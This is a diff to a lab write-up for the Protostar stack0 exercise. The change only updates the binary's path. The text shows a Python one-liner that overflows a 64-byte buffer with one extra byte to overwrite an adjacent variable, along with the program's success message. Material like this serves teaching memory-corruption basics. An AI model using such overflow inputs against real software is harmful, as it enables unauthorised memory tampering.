@@ -38,13 +38,13 @@ We can write 64 char and add at the end the 4 byte of **modified** value.
 Let's write an '**A**' 64 times and than add a 1 in the **modified** variable.
 
 ```bash
-python -c "print('A' * 64 + '\x01')" | ./stack0
+python -c "print('A' * 64 + '\x01')" | /opt/protostar/bin/stack0
 ```
 
 The output of the program will be:
 
 ```bash
-user@protostar:/opt/protostar/bin$ python -c "print('A' * 64 + '\x01')" | ./stack0
+user@protostar:/opt/protostar/bin$ python -c "print('A' * 64 + '\x01')" | /opt/protostar/bin/stack0
 you have changed the 'modified' variable
 ```
 
